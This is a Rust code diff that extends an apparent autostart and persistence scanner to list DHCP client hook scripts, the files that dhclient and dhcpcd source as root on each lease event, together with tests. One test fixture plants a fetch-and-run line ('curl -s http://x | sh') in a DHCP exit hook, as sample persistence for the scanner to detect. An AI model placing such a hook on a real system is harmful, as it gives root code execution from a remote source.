@@ -57,6 +57,8 @@ impl Collector for InitScripts {
         out.extend(sysv(cx));
         out.extend(motd(cx));
         out.extend(dispatcher(cx));
+        out.extend(dhclient_hooks(cx));
+        out.extend(dhcpcd_hooks(cx));
         out
     }
 }
@@ -468,6 +470,202 @@ fn normalize(p: &Path) -> PathBuf {
     out.into_iter().collect()
 }
 
+// ------------------------------------------------------------- DHCP hooks ----
+
+const DHCLIENT_SCRIPTS: [&str; 2] = ["sbin/dhclient-script", "usr/sbin/dhclient-script"];
+const DHCPCD_RUN_HOOKS: [&str; 3] =
+    ["usr/lib/dhcpcd/dhcpcd-run-hooks", "lib/dhcpcd/dhcpcd-run-hooks", "usr/libexec/dhcpcd-run-hooks"];
+const DHCLIENT_ETC: &str = "etc/dhcp";
+const SCRIPT_CAP: usize = 256 * 1024;
+
+/// A DHCP client hook: a file the client's script sources, as root, on every
+/// lease event. Sourced, not executed, so its execute bit does not decide
+/// whether it runs; the script's own rule does.
+fn dhcp_hook(cx: &mut Ctx, rel: &Path, client: &str, phase: &str, runs: bool, why: Option<String>) -> Entry {
+    let name = rel.file_name().unwrap_or_default().to_os_string();
+    let mut e = script_entry(cx, Kind::NetworkDispatcher, rel, &name, Trigger::NetworkEvent);
+    e.note("dispatcher", client);
+    e.note("hook_phase", phase);
+    e.enabled = if runs { Enablement::Enabled } else { Enablement::Disabled };
+    if let Some(why) = why {
+        e.note("not_run", why);
+    }
+    e
+}
+
+/// dhclient runs its hooks from dhclient-script, and the two script lines
+/// on the supported set choose them differently, so the host's own script
+/// is read to see which it is. Debian's sources /etc/dhcp/dhclient-enter-hooks
+/// and -exit-hooks, then what `run-parts --list` selects in the matching .d
+/// directories: names of letters, digits, `_` and `-` only, whatever their
+/// mode. Fedora's sources the same two files, then whatever
+/// `find DIR -executable ! -empty` returns in the .d directories, at any
+/// depth and under any name; and also dhclient-up-hooks when executable, and
+/// each executable dhclient.d/*.sh.
+fn dhclient_hooks(cx: &mut Ctx) -> Vec<Entry> {
+    let Some(script) = DHCLIENT_SCRIPTS.iter().find(|p| cx.root.exists(p)) else { return Vec::new() };
+    let Some(text) = cx.read_capped(script, SCRIPT_CAP) else { return Vec::new() };
+    let has = |needle: &[u8]| text.windows(needle.len()).any(|w| w == needle);
+    let run_parts = has(b"run-parts --list");
+    let find = has(b"-executable ! -empty");
+    let etc = Path::new(DHCLIENT_ETC);
+    let mut out = Vec::new();
+
+    for phase in ["enter", "exit"] {
+        let file = etc.join(format!("dhclient-{phase}-hooks"));
+        if cx.root.stat_follow(&file).is_ok_and(|m| m.is_file) {
+            out.push(dhcp_hook(cx, &file, "dhclient", phase, true, None));
+        }
+        let dir = etc.join(format!("dhclient-{phase}-hooks.d"));
+        let mut files = Vec::new();
+        walk_files(cx, &dir, find, &mut files);
+        files.sort();
+        for rel in files {
+            let name = rel.file_name().unwrap_or_default().as_bytes().to_vec();
+            let (runs, why) = if run_parts {
+                let ok = !name.is_empty() && name.iter().all(|b| b.is_ascii_alphanumeric() || *b == b'_' || *b == b'-');
+                (ok, (!ok).then(|| "run-parts --list skips a name with other characters".to_string()))
+            } else if find {
+                let empty = cx.root.stat_follow(&rel).is_ok_and(|m| m.size == 0);
+                let exec = exec_mode(cx, &rel) != 0;
+                let ok = exec && !empty;
+                (ok, (!ok).then(|| "dhclient-script runs only executable, non-empty files".to_string()))
+            } else {
+                // A script this reader does not recognise: shown as running.
+                (true, None)
+            };
+            out.push(dhcp_hook(cx, &rel, "dhclient", phase, runs, why));
+        }
+    }
+    if find {
+        let up = etc.join("dhclient-up-hooks");
+        if cx.root.stat_follow(&up).is_ok_and(|m| m.is_file) {
+            let exec = exec_mode(cx, &up) != 0;
+            out.push(dhcp_hook(cx, &up, "dhclient", "up", exec, (!exec).then(|| "not executable".to_string())));
+        }
+        let dir = etc.join("dhclient.d");
+        let mut files: Vec<PathBuf> = cx
+            .dir(&dir)
+            .into_iter()
+            .filter(|e| !e.is_dir && e.name.as_bytes().ends_with(b".sh"))
+            .map(|e| dir.join(e.name))
+            .collect();
+        files.sort();
+        for rel in files {
+            let exec = exec_mode(cx, &rel) != 0;
+            out.push(dhcp_hook(cx, &rel, "dhclient", "config", exec, (!exec).then(|| "not executable".to_string())));
+        }
+    }
+    out
+}
+
+/// Every file under `dir`, and under its subdirectories when `deep`: what
+/// `find` walks. Subdirectories are not followed through links.
+fn walk_files(cx: &mut Ctx, dir: &Path, deep: bool, out: &mut Vec<PathBuf>) {
+    for ent in cx.dir(dir) {
+        let rel = dir.join(&ent.name);
+        if ent.is_dir {
+            if deep {
+                walk_files(cx, &rel, deep, out);
+            }
+        } else {
+            out.push(rel);
+        }
+    }
+}
+
+/// dhcpcd-run-hooks sources the files its `for hook in` list names, in
+/// order: /etc/dhcpcd.enter-hook, every file in the hooks directory it was
+/// built with, /etc/dhcpcd.exit-hook. The list is read from the host's own
+/// script, so the directory is wherever that distribution put it. A name
+/// ending in `~` is skipped, as is one `nohook` in dhcpcd.conf names: the
+/// name itself, or with a two-digit prefix, optionally ending in .sh.
+fn dhcpcd_hooks(cx: &mut Ctx) -> Vec<Entry> {
+    let Some(script) = DHCPCD_RUN_HOOKS.iter().find(|p| cx.root.exists(p)) else { return Vec::new() };
+    let Some(text) = cx.read_capped(script, SCRIPT_CAP) else { return Vec::new() };
+    let text = String::from_utf8_lossy(&text);
+    let mut patterns = Vec::new();
+    let mut lines = text.lines().skip_while(|l| l.trim() != "for hook in \\");
+    lines.next();
+    for line in lines {
+        let word = line.trim().trim_end_matches('\\').trim();
+        if word.is_empty() || word == "do" {
+            break;
+        }
+        patterns.push(word.to_string());
+        if !line.trim_end().ends_with('\\') {
+            break;
+        }
+    }
+    let (global, scoped) = nohooks(cx);
+    let skipped_by = |name: &str, list: &[String]| {
+        list.iter().any(|h| {
+            let prefixed = name.len() > 3 && name.as_bytes()[..2].iter().all(u8::is_ascii_digit) && name.as_bytes()[2] == b'-';
+            let rest = if prefixed { &name[3..] } else { "" };
+            name == h || rest == h || rest == format!("{h}.sh")
+        })
+    };
+
+    let mut out = Vec::new();
+    for pat in patterns {
+        let rel = PathBuf::from(pat.trim_start_matches('/'));
+        let files: Vec<PathBuf> = if pat.ends_with("/*") {
+            let dir = rel.parent().unwrap_or(Path::new("")).to_path_buf();
+            let mut f: Vec<PathBuf> = cx
+                .dir(&dir)
+                .into_iter()
+                .filter(|e| !e.is_dir && !e.name.as_bytes().starts_with(b"."))
+                .map(|e| dir.join(e.name))
+                .collect();
+            f.sort();
+            f
+        } else {
+            vec![rel]
+        };
+        for rel in files {
+            if !cx.root.stat_follow(&rel).is_ok_and(|m| m.is_file) {
+                continue;
+            }
+            let name = rel.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
+            let phase = if pat.contains("enter-hook") { "enter" } else if pat.contains("exit-hook") { "exit" } else { "hooks" };
+            let (runs, why) = if name.ends_with('~') {
+                (false, Some("dhcpcd-run-hooks skips a name ending in ~".to_string()))
+            } else if skipped_by(&name, &global) {
+                (false, Some("nohook in dhcpcd.conf".to_string()))
+            } else {
+                (true, None)
+            };
+            let mut e = dhcp_hook(cx, &rel, "dhcpcd", phase, runs, why);
+            if runs && skipped_by(&name, &scoped) {
+                e.note("nohook_for_some_interfaces", "true");
+            }
+            out.push(e);
+        }
+    }
+    out
+}
+
+/// `nohook` names from dhcpcd.conf: those before the first `interface` or
+/// `ssid` block apply everywhere, the rest only to their block.
+fn nohooks(cx: &mut Ctx) -> (Vec<String>, Vec<String>) {
+    let (mut global, mut scoped) = (Vec::new(), Vec::new());
+    let Some(bytes) = cx.read_capped("etc/dhcpcd.conf", SCRIPT_CAP) else { return (global, scoped) };
+    let mut in_block = false;
+    for line in String::from_utf8_lossy(&bytes).lines() {
+        let line = line.split('#').next().unwrap_or_default().trim();
+        let mut words = line.split_whitespace();
+        match words.next() {
+            Some("interface" | "ssid" | "profile") => in_block = true,
+            Some("nohook") => {
+                let names = words.flat_map(|w| w.split(',')).filter(|w| !w.is_empty()).map(String::from);
+                if in_block { scoped.extend(names) } else { global.extend(names) }
+            }
+            _ => {}
+        }
+    }
+    (global, scoped)
+}
+
 fn exec_mode(cx: &Ctx, rel: &Path) -> u32 {
     cx.root.stat_follow(rel).map_or(0, |m| if m.is_file { m.mode & 0o111 } else { 0 })
 }
@@ -815,5 +1013,91 @@ exec /usr/sbin/sshd\n";
         assert!(s.entries.iter().any(|e| e.name == "S"), "a bare S is still an S entry");
         assert!(!s.entries.iter().any(|e| e.name == "README"), "rc runs S* and K* only");
         fs::remove_dir_all(&dir).unwrap();
+    }
+
+    fn hook<'a>(s: &'a Scan, rel: &str) -> &'a Entry {
+        s.entries
+            .iter()
+            .find(|e| e.source.to_string_lossy().ends_with(rel))
+            .unwrap_or_else(|| panic!("no entry for {rel}: {:?}", s.entries.iter().map(|e| &e.source).collect::<Vec<_>>()))
+    }
+
+    #[test]
+    fn debian_dhclient_sources_what_run_parts_lists_whatever_its_mode() {
+        let d = tree("dhclient-deb");
+        put(&d, "sbin/dhclient-script", b"run_hookdir() {\n for script in $(run-parts --list $dir); do run_hook $script; done\n}\n", 0o755);
+        put(&d, "etc/dhcp/dhclient-exit-hooks", b"curl -s http://x | sh\n", 0o644);
+        put(&d, "etc/dhcp/dhclient-exit-hooks.d/zz-wake", b"/opt/listener &\n", 0o644);
+        put(&d, "etc/dhcp/dhclient-exit-hooks.d/old.bak", b"true\n", 0o755);
+        put(&d, "etc/dhcp/dhclient-enter-hooks.d/resolved-enter", b"true\n", 0o644);
+        let s = scan(&d);
+        let wake = hook(&s, "exit-hooks.d/zz-wake");
+        assert_eq!((wake.kind, wake.trigger, wake.enabled), (Kind::NetworkDispatcher, Trigger::NetworkEvent, Enablement::Enabled));
+        assert_eq!(wake.raw["dispatcher"], "dhclient");
+        assert_eq!(wake.raw["hook_phase"], "exit");
+        assert_eq!(hook(&s, "etc/dhcp/dhclient-exit-hooks").enabled, Enablement::Enabled, "the single file is sourced too");
+        let bak = hook(&s, "old.bak");
+        assert_eq!(bak.enabled, Enablement::Disabled, "run-parts skips a dotted name, executable or not");
+        assert!(bak.raw["not_run"].contains("run-parts"));
+        assert_eq!(hook(&s, "resolved-enter").raw["hook_phase"], "enter");
+        fs::remove_dir_all(&d).unwrap();
+    }
+
+    #[test]
+    fn fedora_dhclient_runs_executable_files_at_any_depth_and_its_own_extras() {
+        let d = tree("dhclient-fed");
+        put(&d, "usr/sbin/dhclient-script", b"for script in $(find $dir -executable ! -empty); do\n", 0o755);
+        put(&d, "etc/dhcp/dhclient-exit-hooks.d/nested/deep.sh", b"/opt/x\n", 0o755);
+        put(&d, "etc/dhcp/dhclient-exit-hooks.d/off", b"/opt/y\n", 0o644);
+        put(&d, "etc/dhcp/dhclient-exit-hooks.d/empty", b"", 0o755);
+        put(&d, "etc/dhcp/dhclient-up-hooks", b"/opt/up\n", 0o755);
+        put(&d, "etc/dhcp/dhclient.d/ntp.sh", b"ntp_config() { /opt/ntp; }\n", 0o755);
+        put(&d, "etc/dhcp/dhclient.d/chrony.sh", b"true\n", 0o644);
+        let s = scan(&d);
+        assert_eq!(hook(&s, "nested/deep.sh").enabled, Enablement::Enabled, "find descends and any name counts");
+        assert_eq!(hook(&s, "exit-hooks.d/off").enabled, Enablement::Disabled);
+        assert_eq!(hook(&s, "exit-hooks.d/empty").enabled, Enablement::Disabled);
+        assert_eq!(hook(&s, "dhclient-up-hooks").raw["hook_phase"], "up");
+        assert_eq!(hook(&s, "dhclient.d/ntp.sh").enabled, Enablement::Enabled);
+        assert_eq!(hook(&s, "dhclient.d/chrony.sh").enabled, Enablement::Disabled);
+        fs::remove_dir_all(&d).unwrap();
+    }
+
+    #[test]
+    fn dhcpcd_hooks_come_from_the_list_in_its_own_run_hooks_script() {
+        let d = tree("dhcpcd");
+        put(
+            &d,
+            "usr/libexec/dhcpcd-run-hooks",
+            b"for hook in \\\n\t/etc/dhcpcd.enter-hook \\\n\t/usr/libexec/dhcpcd-hooks/* \\\n\t/etc/dhcpcd.exit-hook\ndo\n",
+            0o755,
+        );
+        put(&d, "etc/dhcpcd.exit-hook", b"/opt/wake &\n", 0o644);
+        put(&d, "usr/libexec/dhcpcd-hooks/20-resolv.conf", b"true\n", 0o644);
+        put(&d, "usr/libexec/dhcpcd-hooks/30-hostname", b"true\n", 0o644);
+        put(&d, "usr/libexec/dhcpcd-hooks/50-ntp.conf", b"true\n", 0o644);
+        put(&d, "usr/libexec/dhcpcd-hooks/40-edit~", b"true\n", 0o644);
+        put(&d, "usr/libexec/dhcpcd-hooks/.hidden", b"true\n", 0o644);
+        put(&d, "etc/dhcpcd.conf", b"nohook hostname\ninterface eth0\nnohook ntp.conf\n", 0o644);
+        let s = scan(&d);
+        let exit = hook(&s, "etc/dhcpcd.exit-hook");
+        assert_eq!((exit.enabled, exit.raw["dispatcher"].as_str(), exit.raw["hook_phase"].as_str()), (Enablement::Enabled, "dhcpcd", "exit"));
+        assert_eq!(hook(&s, "20-resolv.conf").enabled, Enablement::Enabled);
+        assert_eq!(hook(&s, "30-hostname").enabled, Enablement::Disabled, "nohook matches after the two-digit prefix");
+        let ntp = hook(&s, "50-ntp.conf");
+        assert_eq!(ntp.enabled, Enablement::Enabled, "a nohook inside an interface block applies to that interface only");
+        assert_eq!(ntp.raw["nohook_for_some_interfaces"], "true");
+        assert_eq!(hook(&s, "40-edit~").enabled, Enablement::Disabled);
+        assert!(s.entries.iter().all(|e| !e.source.ends_with(".hidden")), "a shell glob skips dotfiles");
+        fs::remove_dir_all(&d).unwrap();
+    }
+
+    #[test]
+    fn dhcp_hooks_without_their_client_run_nothing() {
+        let d = tree("dhcp-none");
+        put(&d, "etc/dhcp/dhclient-exit-hooks.d/zz", b"/opt/x\n", 0o755);
+        put(&d, "etc/dhcpcd.exit-hook", b"/opt/x\n", 0o644);
+        assert!(scan(&d).entries.is_empty());
+        fs::remove_dir_all(&d).unwrap();
     }
 }
